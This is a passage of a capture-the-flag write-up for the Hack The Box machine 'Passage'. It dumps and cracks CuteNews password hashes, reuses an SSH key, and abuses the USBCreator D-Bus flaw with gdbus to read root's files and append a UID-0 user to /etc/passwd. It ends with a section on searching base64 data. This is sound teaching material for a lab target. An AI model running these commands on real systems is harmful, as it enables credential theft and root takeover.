![image-20210305092819060](https://0xdfimages.gitlab.io/img/image-20210305092819060.png)

I can use this one liner to get the `lines` file and pull emails and hashes from it:

```

oxdf@parrot$ curl -s http://passage.htb/CuteNews/cdata/users/lines | grep -v "php die" | while read line; do decode=$(echo $line | base64 -d); email=$(echo $decode | grep -Po '\w+@\w+\.\w+'); hash=$(echo $decode | grep -Po '\w{64}'); if [ -n "$hash" ]; then echo "$email:$hash"; fi; done
nadav@passage.htb:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
sid@example.com:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
kim@example.com:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
egre55@test.com:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9c

```

The command breaks down to looping over each line, decoding it, using regex `grep` to pull the email and hash, and then printing the result if there’s a hash. Here is it with whitespace added for readability:

```

curl -s http://passage.htb/CuteNews/cdata/users/lines | grep -v "php die" | 
while read line; do 
  decode=$(echo $line | base64 -d); 
  email=$(echo $decode | grep -Po '\w+@\w+\.\w+'); 
  hash=$(echo $decode | grep -Po '\w{64}'); 
  if [ -n "$hash" ]; then 
    echo "$email:$hash"; 
  fi; 
done

```

### Crack

Over to my modified [Penglab](https://github.com/mxrch/penglab) notebook, I’ll set the hashes and run:

![image-20200908224619480](https://0xdfimages.gitlab.io/img/image-20200908224619480.png)

The result is:

```

paul-coles: atlanta1
hacker: hacker

```

### su

As paul is a user on the box, I tried `su`, and it worked:

```

www-data@passage:/home$ su - paul 
Password: 
paul@passage:~$ 

```

I can grab `user.txt`:

```

paul@passage:~$ cat user.txt
6ee5cd3b************************

```

I tried to SSH as paul, but it requires key auth:

```

root@kali# ssh paul@10.10.10.206
paul@10.10.10.206: Permission denied (publickey).

```

There is a key pair in `/home/paul/.ssh`, and the public key is already in `authorized_keys`:

```

paul@passage:~/.ssh$ ls   
authorized_keys  id_rsa  id_rsa.pub  known_hosts
paul@passage:~/.ssh$ md5sum authorized_keys id_rsa.pub 
4d241ebb1fef1452f7653b55d625ffbc  authorized_keys
4d241ebb1fef1452f7653b55d625ffbc  id_rsa.pub

```

With that private key, I can SSH as paul:

```

root@kali# ssh -i ~/keys/id_rsa_passage_paul paul@10.10.10.206
paul@passage:~$ 

```

## Shell as nadav

### Enumeration

While looking to solidify my access as paul, I found the key pair in `.ssh`. One thing was odd about the public key:

```

paul@passage:~/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage

```

The user at the end is nadav@passage. Is this actually nadav’s key, or a shared key?

### SSH as nadav

The key works for nadav as well:

```

root@kali# ssh -i ~/keys/id_rsa_passage_paul nadav@10.10.10.206
Last login: Tue Sep  8 20:01:06 2020 from 127.0.0.1
nadav@passage:~$

```

## Shell as root

### Enumeration

nadav is in some interesting groups, including `sudo`:

```

nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

```

Unfortunately, to run `sudo` as nadav requires knowing the account password:

```

nadav@passage:~$ sudo -l
[sudo] password for nadav: 
nadav@passage:~$ sudo su
[sudo] password for nadav:

```

In looking in nadav’s home directory, there’s a `.viminfo` file. While typically `.bash_history` files are set to not record on HTB machines, it seems that `.viminfo` is being used as a clue more and more lately. This contains information about how `vim` interacted with files:

```

# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8

# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        "       12      7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        "       2       0
        .       2       0
        +       2       0

```

I don’t get too much out of this, other than two file names that nadav has been messing with:

```

nadav@passage:~$ ls -l /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf 
-rw-r--r-- 1 root root 766 Apr 29  2015 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-rw-r--r-- 1 root root  65 Jan 15  2019 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

```

Both are owned by root, and at this point, only writable by root.

### Vulnerability Enumeration

#### Polkit

The `51-ubuntu-admin.conf` file is part of [Polkit (formerly PolicyKit)](https://en.wikipedia.org/wiki/Polkit), which provides an API interface for non-privileged processes to communicate with privileged ones. Whenever a Linux system pops a GUI box asking for authentication to do something like update, that’s backed by Polkit.

The file itself defines groups that can invoke privileged processes (with a password):

```

nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

```

`sudo` and `admin` are standard groups for this kind of permission.

I looked at abusing Polkit in [my post on additional root’s for Mischief](/2019/01/08/htb-mischief-more-root.html#policykit), where I showed how to use `pkexec` and `pkttyagent` to get a shell as root. In that case, I actually had the root password, but the user wasn’t allowed to run `su`, so I needed to find another way.

That approach would work here if I had nadav’s password, which I don’t (and if I did, I could just `sudo`).

#### USBCreator

A [blog post](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) from Palo Alto’s Unit42 from July 2019 shows a flaw they found in the USBCreator D-Bus interface which:

> Allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root.

[D-Bus](https://www.freedesktop.org/wiki/Software/dbus/) is a messaging system that is a core system on many Linux systems, allowing for communications between processes running on the same system. This vulnerability is in how this process, interface mistakenly allows for an attacker to trigger it to do something unintended, arbitrary write as root.

### File Read

Exploiting this bug is quite simple. It requires a shell as someone in the `sudo` group (or really, any group defined as permitted by Polkit). If I had nadav’s password, I could likely just `sudo su -` and get a shell, but I don’t.

I’ll use this bug to copy `root.txt` to a file that doesn’t exist, like `/dev/shm/.0xdf`:

```

nadav@passage:~$ ls -la /dev/shm/.0xdf
ls: cannot access '/dev/shm/.0xdf': No such file or directory

```

Most of the command is copied right out of the blog post. I just change the copy from and two file names:

```

nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /dev/shm/.0xdf true
()

```

Now the file exits, is owned by root, but readable, and contains the flag:

```

nadav@passage:~$ ls -l /dev/shm/.0xdf
-rw-r--r-- 1 root root 33 Sep  9 05:12 /dev/shm/.0xdf
nadav@passage:~$ cat /dev/shm/.0xdf
aec339ec************************

```

### Shell

There’s a bunch of ways I could go for root from here, with both read and write as root. A simple favorite is to mess with `/etc/passwd`. I’ll make a copy to work from:

```

nadav@passage:/dev/shm$ cp /etc/passwd passwd

```

I’ll generate a password hash:

```

nadav@passage:/dev/shm$ openssl passwd -1 0xdf
$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/

```

Now I can use that to create a `passwd` line for a new root user, oxdf (Linux usernames can’t start with a digit):

```

nadav@passage:/dev/shm$ echo 'oxdf:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:pwned:/root:/bin/bash' >> passwd 

```

Now I’ll just have USBCreator copy that file back into `/etc`:

```

nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true
()

```

I can confirm my addition is in the file:

```

nadav@passage:/dev/shm$ tail -3 /etc/passwd
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
oxdf:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:pwned:/root:/bin/bash

```

Now I can `su` as oxdf to get a root shell:

```

nadav@passage:/dev/shm$ su - oxdf
Password: 
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)

```

And I can grab `root.txt`:

```

root@passage:~# cat root.txt
aec339ec************************

```

## Beyond Root - Searching in Base64

### Background

Digging through all that base64-encoded data reminded me of an old trick I used to use looking for commands in base64-encoded malware traffic. This is less common today, as attackers have moved to encrypting data in transit. But it’s still a neat trick, and comes in handy when you need to search data with something like Snort or on a local SIEM, but you don’t have the ability to just decode all the data you’re searching through.

Base64 encoding takes six bits at a time, and encodes them into one of 64 ASCII characters ([table here](https://en.wikipedia.org/wiki/Base64#Base64_table)). For example, the string “0xdf”. In binary, first spaced by byte, then re-spaced for base64, and then translated according to the table:

```

00110000 01111000 01100100 01100110
001100 000111 100001 100100 011001 10
M      H      h      k      Z      ?

```

When the number of bits isn’t divisible by six, 0s are applied to fill, and then a `=` is added to the end of the encoded string for each `00` as a signal to remove them on decoding:

```

001100 000111 100001 100100 011001 100000
M      H      h      k      Z      g = =

```

This matches what comes from the `base64` command:

```

$ echo -n "0xdf" | base64
MHhkZg==

```

### Slides

With that understanding in mind, how can I search for a string like “password” in a large blob of base64 data without decoding it? Because three bytes of ASCII exactly encodes to four bytes of base64, when looking for a string, it can show up encoded in three possible forms. For example:

```

$ echo -n "0xdf" | base64
MHhkZg==
$ echo -n "a0xdf" | base64
YTB4ZGY=
$ echo -n "ab0xdf" | base64
YWIweGRm
$ echo -n "abc0xdf" | base64
YWJjMHhkZg==

```

The “0xdf” in the first and forth examples shows up the same, as `MHhkZg==`. If there’s more after the “0xdf”, it will change the end that was zero padded:

```

$ echo -n "abc0xdf" | base64
YWJjMHhkZg==
$ echo -n "abc0xdfa" | base64
YWJjMHhkZmE=
$ echo -n "abc0xdfab" | base64
YWJjMHhkZmFi

```

But the `MHhkZ` is consistent.

### Cyberchef

[Cyberchef](https://gchq.github.io/CyberChef/#recipe=Show_Base64_offsets('A-Za-z0-9%2B/%3D',true,'Raw')&input=cGF1bA) has a recipe for this called Show Base64 offsets. With `paul` as input, the output is:

![image-20200908225335210](https://0xdfimages.gitlab.io/img/image-20200908225335210.png)

Using those search terms, to find the string “paul” in the user data, I can `grep` across all the files with:
- `-l` - only list file name, not content
- `-R` - recursive
- `-e` - return a successful match on finding any of these.

Four files are identified:

```

www-data@passage:/var/www/html/CuteNews/cdata/users$ grep -lR -e cGF1b -e BhdW -e wYXVs
b0.php
09.php
lines
77.php

```

Now I can look in those to find paul’s hash:

```

www-data@passage:/var/www/html/CuteNews/cdata/users$ cat b0.php | grep -v die | base64 -d
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

```